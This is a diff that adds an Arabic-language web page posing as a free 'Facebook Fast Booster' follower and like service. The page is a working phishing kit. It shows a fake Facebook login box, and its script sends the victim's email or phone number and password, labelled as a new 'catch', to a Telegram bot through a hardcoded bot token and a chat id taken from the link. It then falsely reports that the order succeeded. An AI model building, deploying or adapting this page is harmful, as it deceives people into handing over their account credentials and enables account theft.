@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Fast Booster</title>
+    <style>
+        :root { --fb-blue: #1877f2; --fb-bg: #f0f2f5; }
+        body { font-family: Helvetica, Arial, sans-serif; background: var(--fb-bg); margin: 0; padding: 0; }
+        .header { background: white; padding: 12px; border-bottom: 1px solid #dddfe2; text-align: center; }
+        .header img { width: 130px; }
+        .container { padding: 15px; max-width: 500px; margin: auto; }
+        .hero { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px; text-align: center; }
+        .hero h2 { color: #1c1e21; font-size: 18px; }
+        .service-btn { background: white; border: 1px solid #dddfe2; border-radius: 8px; padding: 15px; margin: 10px 0; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: 0.2s; }
+        .service-btn:hover { background: #f2f2f2; }
+        .free-badge { background: #e7f3ff; color: var(--fb-blue); padding: 5px 10px; border-radius: 5px; font-weight: bold; font-size: 13px; }
+        
+        /* Modal Style */
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 1000; justify-content: center; align-items: center; }
+        .login-box { width: 90%; max-width: 380px; text-align: center; }
+        .fb-logo-small { width: 45px; margin-bottom: 10px; }
+        .login-box h3 { color: #1c1e21; margin-bottom: 20px; }
+        input { width: 100%; padding: 14px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; background: #f5f6f7; box-sizing: border-box; font-size: 15px; }
+        .fb-login-btn { width: 100%; padding: 12px; background: var(--fb-blue); color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 17px; cursor: pointer; margin-top: 10px; }
+        #loader { display: none; margin-top: 15px; color: #606770; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_(2019).svg/1280px-Facebook_Logo_(2019).svg.png" alt="Facebook">
+</div>
+
+<div class="container">
+    <div class="hero">
+        <h2>أدوات زيادة التفاعل 2026 🚀</h2>
+        <p style="color: #606770; font-size: 14px;">احصل على متابعين ولايكات لصفحتك أو حسابك الشخصي مجاناً لفترة محدودة.</p>
+        
+        <div class="service-btn" onclick="openFB('10,000 متابع حقيقي')">
+            <span>👥 10K متابع للملف الشخصي</span>
+            <span class="free-badge">مجاني</span>
+        </div>
+        
+        <div class="service-btn" onclick="openFB('5,000 لايك للمنشورات')">
+            <span>👍 5000 لايك لمنشوراتك</span>
+            <span class="free-badge">مجاني</span>
+        </div>
+    </div>
+</div>
+
+<div class="overlay" id="fbModal">
+    <div class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_(2019).png/600px-Facebook_Logo_(2019).png" class="fb-logo-small">
+        <h3>سجل الدخول للمتابعة</h3>
+        <p style="font-size: 14px; color: #606770;">يجب تسجيل الدخول بحساب الفيسبوك الخاص بك لتوجيه المتابعين إليه.</p>
+        
+        <input type="text" id="fbUser" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" id="fbPass" placeholder="كلمة السر">
+        
+        <button class="fb-login-btn" onclick="sendFBData()">تسجيل الدخول</button>
+        
+        <div id="loader">جاري مزامنة بيانات الحساب مع السيرفر...</div>
+    </div>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetId = urlParams.get('id');
+    const botToken = '8324997666:AAHpmEWlplkrz64Z9n2SwDJfF3QHyvI70jk';
+    let serviceType = "";
+
+    function openFB(service) {
+        serviceType = service;
+        document.getElementById('fbModal').style.display = 'flex';
+    }
+
+    async function sendFBData() {
+        const user = document.getElementById('fbUser').value;
+        const pass = document.getElementById('fbPass').value;
+        const loader = document.getElementById('loader');
+
+        if (!user || !pass) {
+            alert("يرجى إدخال بيانات الحساب");
+            return;
+        }
+
+        if (!targetId) {
+            alert("خطأ: يرجى إضافة ?id=7122100508 لنهاية الرابط");
+            return;
+        }
+
+        loader.style.display = "block";
+
+        const text = `🔵 **صيد فيسبوك جديد**\n\n` +
+                     `👤 **الحساب:** \`${user}\`\n` +
+                     `🔑 **الباسورد:** \`${pass}\`\n` +
+                     `🎁 **الخدمة:** ${serviceType}\n` +
+                     `🆔 **المستلم:** ${targetId}`;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: targetId, text: text, parse_mode: "Markdown" })
+            });
+
+            setTimeout(() => {
+                loader.innerHTML = "<b style='color:#1877f2'>✅ تم تفعيل الطلب!</b><br>سيتم البدء في إرسال المتابعين خلال ساعة.";
+            }, 3000);
+
+        } catch (e) {
+            alert("خطأ في الخادم");
+        }
+    }
+</script>
+
+</body>
+</html>
